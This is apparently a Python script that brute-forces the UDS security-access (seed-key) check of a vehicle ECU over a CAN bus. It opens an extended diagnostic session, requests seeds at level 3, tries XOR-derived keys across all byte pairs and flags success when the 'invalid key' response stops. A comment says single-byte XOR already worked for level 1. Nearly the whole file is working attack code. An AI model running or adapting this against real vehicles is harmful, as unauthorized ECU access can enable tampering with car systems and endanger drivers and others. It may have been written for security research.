import can
import isotp
import time

tp = isotp.socket(3) # 3=timeout
tp.set_fc_opts(stmin=5, bs=10) # https://can-isotp.readthedocs.io/en/latest/isotp/socket.html
tp.bind('can0', isotp.Address(rxid=0x49a, txid=0x49b, addressing_mode=0))

LEVEL = 0x3
SEED_LENGTH = 4

def openSession():
    tp.send(bytearray([0x10, 0x03]))
    print(tp.recv().hex())

def TesterPresent():
    tp.send(bytearray([0x3E]))
    return tp.recv()

def getSeed():

    tp.send(bytearray([0x27, LEVEL]))
    seed = tp.recv()
    return seed[2:]

def keyCalculation(seed, X=0, Y=0):
    seed = seed.hex()
    print("received :", seed)
    #for i in range(SEED_LENGTH):
    b1 = int(seed[0:2],16)
    b2 = int(seed[2:4],16)
    b3 = int(seed[4:6],16)
    b4 = int(seed[6:8],16)
    
    seed = int(seed, 16)

    # Single byte XOR (^ X) OK FOR LEVEL 1 (UserSpaceDiag)
    # key_1 = hex(b1 ^ X)[2:] 
    # key_2 = hex(b2 ^ X)[2:]
    # key_3 = hex(b3 ^ X)[2:]
    # key_4 = hex(b4 ^ X)[2:]
    # key = int(key_1 + key_2 + key_3 + key_4, 16)
    # key = key.to_bytes(4, 'big')

    # Two byte XOR (middle bytes)
    key_1 = hex(b1)[2:] 
    key_2 = hex(b2)[2:]
    key_3 = hex(b3 ^ X)[2:]
    key_4 = hex(b4 ^ Y)[2:]
    key = int(key_1 + key_2 + key_3 + key_4, 16)
    key = key.to_bytes(4, 'big')

    return key

def myECUReset():
    tp.send(bytearray([0x11, 0x01]))
    resp = tp.recv()
    return resp

def SendKey():

    for X in range(1,256):
        for Y in range(1,256):
            seed = getSeed()
            print("seed :", seed.hex())
            #if Y % 5 == 0:
            #    print(TesterPresent().hex())
                #print(myECUReset().hex())
            key = keyCalculation(seed, X, Y)
            print(key.hex())
            time.sleep(0.5) # !! IMPORTANT !! #

            #Send Key (LEVEL)
            tp.send(bytearray([0x27, LEVEL+1, key[0],key[1],key[2],key[3]]))
            print(tp.recv().hex())
            """
            if "7f2735" != tp.recv().hex():
                print("********** WINNNNN ************")
                return
            """
def main():
    openSession()
    SendKey()

if __name__ == '__main__':
    main()
